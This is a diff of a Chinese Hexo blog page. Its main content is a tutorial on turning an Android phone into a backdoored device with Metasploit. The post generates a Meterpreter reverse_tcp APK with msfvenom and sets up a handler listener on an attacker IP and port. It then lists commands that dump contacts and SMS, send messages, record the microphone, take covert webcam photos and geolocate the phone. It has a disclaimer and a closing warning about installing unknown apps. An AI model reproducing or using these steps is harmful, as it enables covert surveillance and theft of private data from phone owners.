@@ -1,29 +1,21 @@
 <!DOCTYPE html>
 <html>
-<head>
+<head><meta name="generator" content="Hexo 3.8.0">
   <meta charset="utf-8">
   
   <meta name="renderer" content="webkit">
-  <meta http-equiv="X-UA-Compatible" content="IE=edge" >
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
   <link rel="dns-prefetch" href="http://y00z.github.io">
   <title>msf渗透android并植入后门 | Yooz的博客</title>
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
-  <meta name="description" content="前言
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
-
-
-正文
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动">
+  <meta name="description" content="前言 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！  正文 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的">
+<meta name="keywords" content="安卓,安全攻防">
 <meta property="og:type" content="article">
 <meta property="og:title" content="msf渗透android并植入后门">
 <meta property="og:url" content="http://y00z.github.io/2016/12/19/diary-2016-1219-01/index.html">
 <meta property="og:site_name" content="Yooz的博客">
-<meta property="og:description" content="前言
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
-
-
-正文
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动">
+<meta property="og:description" content="前言 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！  正文 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的">
+<meta property="og:locale" content="zh-Hans">
 <meta property="og:image" content="http://y00z.github.io/images/pasted-10.png">
 <meta property="og:image" content="http://y00z.github.io/images/pasted-11.png">
 <meta property="og:image" content="http://y00z.github.io/images/pasted-12.png">
@@ -47,21 +39,16 @@
 <meta property="og:image" content="http://y00z.github.io/images/pasted-30.png">
 <meta property="og:image" content="http://y00z.github.io/images/pasted-31.png">
 <meta property="og:image" content="http://y00z.github.io/images/pasted-32.png">
-<meta property="og:updated_time" content="2017-07-13T11:06:56.368Z">
+<meta property="og:updated_time" content="2017-07-13T11:06:56.369Z">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:title" content="msf渗透android并植入后门">
-<meta name="twitter:description" content="前言
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！
-
-
-正文
-&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动">
+<meta name="twitter:description" content="前言 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！  正文 &amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;&amp;nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的">
 <meta name="twitter:image" content="http://y00z.github.io/images/pasted-10.png">
   
     <link rel="alternative" href="/atom.xml" title="Yooz的博客" type="application/atom+xml">
   
   
-    <link rel="icon" href="http://oi6ni1o6u.bkt.clouddn.com/tx.png">
+    <link rel="icon" href="https://raw.githubusercontent.com/Y00z/Test/master/tx.jpg">
   
   <link rel="stylesheet" type="text/css" href="/./main.266c1c.css">
   <style type="text/css">
@@ -85,7 +72,7 @@ var _hmt = _hmt || [];
 
 
 </head>
-
+</html>
 <body>
   <div id="container" q-class="show:isCtnShow">
     <canvas id="anm-canvas" class="anm-canvas"></canvas>
@@ -95,7 +82,7 @@ var _hmt = _hmt || [];
 <div class="intrude-less">
 	<header id="header" class="inner">
 		<a href="/" class="profilepic">
-			<img src="http://oi6ni1o6u.bkt.clouddn.com/tx.png" class="js-avatar">
+			<img src="https://raw.githubusercontent.com/Y00z/Test/master/tx.jpg" class="js-avatar">
 		</a>
 		<hgroup>
 		  <h1 class="header-author"><a href="/">悠哉&#39;</a></h1>
@@ -149,7 +136,7 @@ var _hmt = _hmt || [];
 	<div class="intrude-less">
 		<header id="header" class="inner">
 			<div class="profilepic">
-				<img src="http://oi6ni1o6u.bkt.clouddn.com/tx.png" class="js-avatar">
+				<img src="https://raw.githubusercontent.com/Y00z/Test/master/tx.jpg" class="js-avatar">
 			</div>
 			<hgroup>
 			  <h1 class="header-author js-header-author">悠哉&#39;</h1>
@@ -218,7 +205,6 @@ var _hmt = _hmt || [];
       
         <h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><blockquote>
 <font color="#ff0000">&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;<strong>文中提及的部分技术，可能带有一定攻击性，仅供安全学习和教学用途，禁止非法使用！</strong></font>
-
 </blockquote>
 <h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><blockquote>
 <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;msf原名Metasploit是一款开源的安全漏洞检测工具，可以帮助安全和IT专业人士识别安全性问题，验证漏洞的缓解措施，并管理专家驱动的安全性进行评估，提供真正的安全风险情报。这些功能包括智能开发，代码审计，Web应用程序扫描，社会工程 <a id="more"></a>。团队合作，在Metasploit和综合报告提出了他们的发现。</p>
@@ -228,8 +214,14 @@ var _hmt = _hmt || [];
 <li>BackBox、kali linux、或者BackTrack(kali linux的前身)</li>
 <li>一台安卓设备</li>
 </ul>
+</blockquote>
+<blockquote>
 <p>环境不说太多介绍了，直接来实战。</p>
-<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><p>装好环境后查看自己的ip<br><img src="/images/pasted-10.png" alt=""></p>
+</blockquote>
+<h3 id="生成payload"><a href="#生成payload" class="headerlink" title="生成payload"></a>生成payload</h3><blockquote>
+<p>装好环境后查看自己的ip<br><img src="/images/pasted-10.png" alt></p>
+</blockquote>
+<blockquote>
 <p>生成一个payload</p>
 <pre><code>msfvenom -p android/meterpreter/reverse_tcp LHOST=your_ip LPORT=your_port R &gt; /root/apk.apk
 </code></pre><ul>
@@ -238,18 +230,20 @@ var _hmt = _hmt || [];
 <li>LPORT 设置用来接收反弹连接的端口</li>
 </ul>
 </blockquote>
-<p><img src="/images/pasted-11.png" alt=""></p>
+<p><img src="/images/pasted-11.png" alt></p>
 <blockquote>
-<p>很小，才8kb<br>如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。<br>生成的apk放到手机上安装，安装完成后是这样的。<br><img src="/images/pasted-12.png" alt=""></p>
+<p>很小，才8kb<br>如果用的BackTrack，里面的msf是旧版本的了。旧版本的生成payload是msfpayload。<br>生成的apk放到手机上安装，安装完成后是这样的。<br><img src="/images/pasted-12.png" alt></p>
 </blockquote>
 <h3 id="反弹shell"><a href="#反弹shell" class="headerlink" title="反弹shell"></a>反弹shell</h3><blockquote>
-<p>启动msf<br><img src="/images/pasted-13.png" alt=""><br>依次输入命令来设置paylod和反弹的ip以及反弹端口(ip和端口必须和生成payload时候的一致)</p>
+<p>启动msf<br><img src="/images/pasted-13.png" alt><br>依次输入命令来设置paylod和反弹的ip以及反弹端口(ip和端口必须和生成payload时候的一致)</p>
 <pre><code>* use exploit/multi/handler
 * set payload android/meterpreter/reverse_tcp
 * set LHOST 192.168.0.18 
 * set LPORT 2333
-</code></pre><p><img src="/images/pasted-14.png" alt=""><br>设置完毕后就可以输入 <code>exploit</code> 来执行攻击了<br><img src="/images/pasted-15.png" alt=""></p>
-<p>可以看到msf会一直在监听本机的2333端口，等待着目标连接上线<br>然后我打开我们刚刚安装的<br>打开后会连接到msf<br><img src="/images/pasted-16.png" alt=""><br><img src="/images/pasted-17.png" alt=""><br>这样我们就拿到了手机的shell</p>
+</code></pre><p><img src="/images/pasted-14.png" alt><br>设置完毕后就可以输入 <code>exploit</code> 来执行攻击了<br><img src="/images/pasted-15.png" alt></p>
+</blockquote>
+<blockquote>
+<p>可以看到msf会一直在监听本机的2333端口，等待着目标连接上线<br>然后我打开我们刚刚安装的<br>打开后会连接到msf<br><img src="/images/pasted-16.png" alt><br><img src="/images/pasted-17.png" alt><br>这样我们就拿到了手机的shell</p>
 </blockquote>
 <h3 id="控制指令"><a href="#控制指令" class="headerlink" title="控制指令"></a>控制指令</h3><blockquote>
 <p>我来介绍几个有意思的指令。</p>
@@ -268,50 +262,50 @@ var _hmt = _hmt || [];
 * shell            #进入手机的bash shell
 </code></pre></blockquote>
 <h5 id="check-root-检测root"><a href="#check-root-检测root" class="headerlink" title="check_root(检测root)"></a>check_root(检测root)</h5><blockquote>
-<p><img src="/images/pasted-18.png" alt=""><br>是root的设备</p>
+<p><img src="/images/pasted-18.png" alt><br>是root的设备</p>
 </blockquote>
 <h5 id="dump-contacts-下载联系人"><a href="#dump-contacts-下载联系人" class="headerlink" title="dump_contacts(下载联系人)"></a>dump_contacts(下载联系人)</h5><blockquote>
-<p><img src="/images/pasted-19.png" alt=""><br>57个联系人<br><img src="/images/pasted-20.png" alt=""></p>
+<p><img src="/images/pasted-19.png" alt><br>57个联系人<br><img src="/images/pasted-20.png" alt></p>
 </blockquote>
 <h5 id="dump-sms-下载短信"><a href="#dump-sms-下载短信" class="headerlink" title="dump_sms(下载短信)"></a>dump_sms(下载短信)</h5><blockquote>
-<p><img src="/images/pasted-21.png" alt=""><br>1271条短信<br><img src="/images/pasted-22.png" alt=""></p>
+<p><img src="/images/pasted-21.png" alt><br>1271条短信<br><img src="/images/pasted-22.png" alt></p>
 </blockquote>
 <h5 id="send-sms-发送短信"><a href="#send-sms-发送短信" class="headerlink" title="send_sms(发送短信)"></a>send_sms(发送短信)</h5><blockquote>
 <ul>
 <li>-d目标电话号码</li>
-<li>-t 短信内容<br><img src="/images/pasted-23.png" alt=""><br><img src="/images/pasted-24.png" alt=""></li>
+<li>-t 短信内容<br><img src="/images/pasted-23.png" alt><br><img src="/images/pasted-24.png" alt></li>
 </ul>
 </blockquote>
 <h5 id="record-mic-录音"><a href="#record-mic-录音" class="headerlink" title="record_mic(录音)"></a>record_mic(录音)</h5><blockquote>
 <ul>
-<li>-d 录音的秒数<br>音频文件会自动保存在/var/www/html/目录下<br><img src="/images/pasted-25.png" alt=""></li>
+<li>-d 录音的秒数<br>音频文件会自动保存在/var/www/html/目录下<br><img src="/images/pasted-25.png" alt></li>
 </ul>
 </blockquote>
 <h5 id="webcam-list-检测摄像头"><a href="#webcam-list-检测摄像头" class="headerlink" title="webcam_list(检测摄像头)"></a>webcam_list(检测摄像头)</h5><blockquote>
-<p><img src="/images/pasted-26.png" alt=""><br>2:前置摄像头<br>1:后置摄像头</p>
+<p><img src="/images/pasted-26.png" alt><br>2:前置摄像头<br>1:后置摄像头</p>
 </blockquote>
 <h5 id="webcam-snap-拍照"><a href="#webcam-snap-拍照" class="headerlink" title="webcam_snap(拍照)"></a>webcam_snap(拍照)</h5><blockquote>
 <ul>
-<li>-i 选择使用哪个摄像头拍照<br>手机息屏的时候也可以拍照<br><img src="/images/pasted-27.png" alt=""></li>
+<li>-i 选择使用哪个摄像头拍照<br>手机息屏的时候也可以拍照<br><img src="/images/pasted-27.png" alt></li>
 </ul>
 </blockquote>
 <h5 id="webcam-stream-连续拍照"><a href="#webcam-stream-连续拍照" class="headerlink" title="webcam_stream(连续拍照)"></a>webcam_stream(连续拍照)</h5><blockquote>
 <ul>
 <li>-i 指定摄像头</li>
-<li>-d 拍照间隔(默认1800毫秒)<br>使用目标手机摄像头连续拍照。会生成一个html文件,打开html，查看连续拍照照片<br><img src="/images/pasted-28.png" alt=""></li>
+<li>-d 拍照间隔(默认1800毫秒)<br>使用目标手机摄像头连续拍照。会生成一个html文件,打开html，查看连续拍照照片<br><img src="/images/pasted-28.png" alt></li>
 </ul>
 </blockquote>
 <h5 id="geolocate-获取地理位置"><a href="#geolocate-获取地理位置" class="headerlink" title="geolocate(获取地理位置)"></a>geolocate(获取地理位置)</h5><blockquote>
-<p><img src="/images/pasted-29.png" alt=""></p>
+<p><img src="/images/pasted-29.png" alt></p>
 </blockquote>
 <h5 id="upload-上传文件到手机"><a href="#upload-上传文件到手机" class="headerlink" title="upload(上传文件到手机)"></a>upload(上传文件到手机)</h5><blockquote>
-<p><img src="/images/pasted-30.png" alt=""></p>
+<p><img src="/images/pasted-30.png" alt></p>
 </blockquote>
 <h5 id="download-下载文件到手机"><a href="#download-下载文件到手机" class="headerlink" title="download(下载文件到手机)"></a>download(下载文件到手机)</h5><blockquote>
-<p><img src="/images/pasted-31.png" alt=""></p>
+<p><img src="/images/pasted-31.png" alt></p>
 </blockquote>
 <h5 id="shell-进入手机bash-shell"><a href="#shell-进入手机bash-shell" class="headerlink" title="shell(进入手机bash shell)"></a>shell(进入手机bash shell)</h5><blockquote>
-<p><img src="/images/pasted-32.png" alt=""></p>
+<p><img src="/images/pasted-32.png" alt></p>
 </blockquote>
 <h3 id="最后"><a href="#最后" class="headerlink" title="最后"></a>最后</h3><blockquote>
 <p>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;这些操作都是可以在不用接触手机，而且手机也不会有任何提示下完成。所以同学们最好不要安装来历不明的app，后患无穷。</p>
@@ -333,13 +327,13 @@ var _hmt = _hmt || [];
                   <div class="reward-box">
                     
                     <div class="reward-box-item">
-                      <img class="reward-img" src="http://oi6ni1o6u.bkt.clouddn.com/zhifubao1.jpg">
+                      <img class="reward-img" src="https://raw.githubusercontent.com/Y00z/Test/master/zhifubao.jpg">
                       <span class="reward-type">支付宝</span>
                     </div>
                     
                     
                     <div class="reward-box-item">
-                      <img class="reward-img" src="http://oi6ni1o6u.bkt.clouddn.com/weixin1.jpg">
+                      <img class="reward-img" src="https://raw.githubusercontent.com/Y00z/Test/master/wenxin.jpg">
                       <span class="reward-type">微信</span>
                     </div>
                     
@@ -475,7 +469,7 @@ var _hmt = _hmt || [];
   
 
   
-  <div id="SOHUCS" sid="diary-2016-1219-01" ></div> 
+  <div id="SOHUCS" sid="diary-2016-1219-01"></div> 
 <script type="text/javascript"> 
 (function(){ 
 var appid = "cysYxW0PK"; 
@@ -495,7 +489,7 @@ window.document.write('<script id="changyan_mobile_js" charset="utf-8" type="tex
   <div class="outer">
     <div id="footer-info">
     	<div class="footer-left">
-    		&copy; 2018 悠哉&#39;
+    		&copy; 2019 悠哉&#39;
     	</div>
       	<div class="footer-right">
       		<a href="http://hexo.io/" target="_blank">Hexo</a>  Theme <a href="https://github.com/litten/hexo-theme-yilia" target="_blank">Yilia</a> by Litten
@@ -570,6 +564,14 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
           <ul class="article-tag-list" q-show="showTags">
              
               <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color3">安卓</a>
+              </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color5">安全攻防</a>
+              </li>
+             
+              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">hexo</a>
               </li>
              
@@ -578,27 +580,15 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">安卓</a>
-              </li>
-             
-              <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color2">NodeJs</a>
               </li>
              
               <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color5">安全攻防</a>
+                <a href="javascript:void(0)" class="js-tag color3">React-Native</a>
               </li>
              
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color4">小程序</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color4">反编译</a>
-              </li>
-             
-              <li class="article-tag-list-item">
-                <a href="javascript:void(0)" class="js-tag color3">React-Native</a>
               </li>
              
               <li class="article-tag-list-item">
@@ -624,13 +614,17 @@ return o(i(t),arguments.length<2?void 0:u(arguments[1]))}})},function(t,n,r){var
               <li class="article-tag-list-item">
                 <a href="javascript:void(0)" class="js-tag color5">wifi</a>
               </li>
+             
+              <li class="article-tag-list-item">
+                <a href="javascript:void(0)" class="js-tag color4">反编译</a>
+              </li>
             
             <div class="clearfix"></div>
           </ul>
         </div>
         <ul class="search-ul">
           <p q-show="jsonFail" style="padding: 20px; font-size: 12px;">
-            缺失模块。<br/>1、请确保node版本大于6.2<br/>2、在博客根目录（注意不是yilia根目录）执行以下命令：<br/> npm i hexo-generator-json-content --save<br/><br/>
+            缺失模块。<br>1、请确保node版本大于6.2<br>2、在博客根目录（注意不是yilia根目录）执行以下命令：<br> npm i hexo-generator-json-content --save<br><br>
             3、在根目录_config.yml里添加配置：
 <pre style="font-size: 12px;" q-show="jsonFail">
   jsonContent:
